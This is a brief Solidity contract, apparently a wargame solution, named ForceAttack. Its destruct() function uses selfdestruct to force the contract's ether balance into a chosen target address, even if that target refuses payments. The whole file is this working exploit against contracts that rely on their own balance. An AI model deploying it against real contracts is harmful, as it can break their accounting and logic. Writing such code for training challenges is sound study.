pragma solidity ^0.4.18;

contract ForceAttack {
    address forceAddress;

    function ForceAttack(address _addr) public payable {
        forceAddress = _addr;
    }

    function destruct() public {
        selfdestruct(forceAddress);
    }
}
